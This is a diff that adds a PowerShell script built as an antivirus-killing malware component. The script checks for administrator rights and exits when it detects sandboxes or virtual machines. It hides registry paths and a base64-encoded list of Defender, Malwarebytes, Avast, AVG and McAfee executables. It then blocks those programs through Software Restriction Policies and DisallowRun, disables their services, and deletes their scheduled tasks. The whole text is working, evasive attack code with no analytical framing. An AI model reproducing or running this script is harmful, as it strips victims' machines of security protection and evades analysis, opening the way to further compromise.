@@ -1,0 +1,83 @@
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    Write-Host "i ok." -ForegroundColor Red
+    exit
+}
+
+$s = $false
+$o = @()
+$x = $env:COMPUTERNAME; if ($x -match "WIN7|SANDBOX|TEST|MAL") { $o += "i ok: $x"; $s = $true }
+$c = (Get-CimInstance Win32_Processor).NumberOfLogicalProcessors; if ($c -lt 2) { $o += "i ok: $c"; $s = $true }
+$m = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1); if ($m -lt 2) { $o += "i ok: ${m}GB"; $s = $true }
+$u = $env:USERNAME; if ($u -match "sandbox|test|malware") { $o += "i ok: $u"; $s = $true }
+$b = (Get-CimInstance Win32_BIOS).Manufacturer; if ($b -match "VBOX|VMware|QEMU|Xen|Microsoft") { $o += "i ok: $b"; $s = $true }
+$z = (Get-CimInstance Win32_BaseBoard).Manufacturer; if ($z -match "VBOX|VMware|QEMU|Xen|Microsoft") { $o += "i ok: $z"; $s = $true }
+if ($s) { Write-Host "i ok" -ForegroundColor Red; $o | ForEach-Object { Write-Host $_ -ForegroundColor Yellow }; exit }
+
+
+$k = @(72,75,76,77); $r = ':'+[char]92; $p = @("SOFTWARE","Microsoft","Windows","CurrentVersion","Policies","Explorer")
+$obfHKLM = ([string]::Join('', ($k | ForEach-Object {[char]$_}))) + $r + ($p -join ([char]92))
+$obfDRKey = "$obfHKLM\DisallowRun"
+
+function Ensure-RegistryPath { param ([string]$p); if (-not [string]::IsNullOrWhiteSpace($p) -and -not (Test-Path $p)) {
+    try { New-Item -Path $p -Force -ErrorAction Stop | Out-Null } catch { Write-Warning "error: $p" }
+} }
+
+$srpBase = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers"
+$srpPaths = "$srpBase\0\Paths"
+Ensure-RegistryPath -p "$srpPaths"
+
+# Ensure Explorer and DisallowRun key exist
+if (-not (Test-Path $obfHKLM)) { New-Item -Path $obfHKLM -Force | Out-Null }
+if (-not (Test-Path $obfDRKey)) { New-Item -Path $obfDRKey -Force | Out-Null }
+
+Set-ItemProperty -Path $srpBase -Name ([string]::Join('',('T','r','a','n','s','p','a','r','e','n','t','E','n','a','b','l','e','d'))) -Value 1 -Type DWord -Force
+Set-ItemProperty -Path $srpBase -Name ([string]::Join('','PolicyScope')) -Value 0 -Type DWord -Force
+Set-ItemProperty -Path $srpBase -Name ([string]::Join('','DefaultLevel')) -Value 0 -Type DWord -Force
+
+$f = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("TVNBU0NVaS5leGUsbXNtcGVuZy5leGUsRGVmZW5kZXIuZXhlLERlZmVuZGVyRGFlbW9uLmV4ZSxtYmFtLmV4ZSxtYmFtdHJheS5leGUsTUJBTVNlcnZpY2UuZXhlLE1CQU1Xc2MuZXhlLG1idW5zLmV4ZSxNYmFtUHQuZXhlLGF2cC5leGUsYXZwdWkuZXhlLGthdi5leGUsYXN3RW5nU3J2LmV4ZSxBdmFzdFN2Yy5leGUsQXZhc3RVSS5leGUsQXZhc3RCcm93c2VyQ3Jhc2hIYW5kbGVyLmV4ZSxhc3dpZHNhZ2VudC5leGUsd3NjX3Byb3h5LmV4ZSxBVkdCcm93c2VyQ3Jhc2hIYW5kbGVyLmV4ZSxBVkdCcm93c2VyQ3Jhc2hIYW5kbGVyNjQuZXhlLEFWR1VJLmV4ZSxBVkdTdmMuZXhlLE1mZUFWU3ZjLmV4ZSxtZmVmaXJlLmV4ZSxtZmV2dHBzLmV4ZSxtY3NoaWVsZC5leGUsTWNQdlRyYXkuZXhlLE1jVUlDbnQuZXhlLE1jSW5zdHJ1VHJhY2suZXhlLE1jQ1NQU2VydmljZUhvc3QuZXhl")).Split(',')
+$exeBlockList = $f
+
+foreach ($exe in $exeBlockList) {
+    $g = [guid]::NewGuid().ToString()
+    $rp = "$srpPaths\$g"
+    New-Item -Path $rp -Force | Out-Null
+    Set-ItemProperty -Path $rp -Name "ItemData" -Value "*\$exe" -Type String
+    Set-ItemProperty -Path $rp -Name "SaferFlags" -Value 0 -Type DWord
+    Set-ItemProperty -Path $rp -Name "LastModified" -Value ([datetime]::Now) -Type String
+}
+Write-Host "✅ SRP" -ForegroundColor Green
+
+New-ItemProperty -Path $obfHKLM -Name "DisallowRun" -PropertyType DWord -Value 1 -Force | Out-Null
+$c = 1
+foreach ($e in $exeBlockList) {
+    New-ItemProperty -Path $obfDRKey -Name "$c" -PropertyType String -Value $e -Force | Out-Null
+    $c++
+}
+Write-Host "✅ Disall" -ForegroundColor Green
+
+foreach ($n in $exeBlockList) {
+    try {
+        Get-Service | Where-Object { $_.Name -like "*$(Split-Path $n -LeafBase)*" } | ForEach-Object {
+            Write-Host "⛔ stop: $($_.Name)"
+            Stop-Service -Name $_.Name -Force -ErrorAction SilentlyContinue
+            Set-Service -Name $_.Name -StartupType Disabled -ErrorAction SilentlyContinue
+        }
+    } catch {
+        Write-Warning "⚠ error stop $n"
+    }
+}
+
+Get-ScheduledTask | Where-Object {
+    $t = $_.TaskName.ToLower()
+    $exeBlockList | ForEach-Object { if ($t -like "*$_*".ToLower()) { return $true } }
+} | ForEach-Object {
+    try {
+        Write-Host "clear: $($_.TaskName)"
+        Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
+    } catch {
+        Write-Warning "⚠ error clear $_"
+    }
+}
+
+Write-Host "\n🔒 oki restart?." -ForegroundColor Cyan
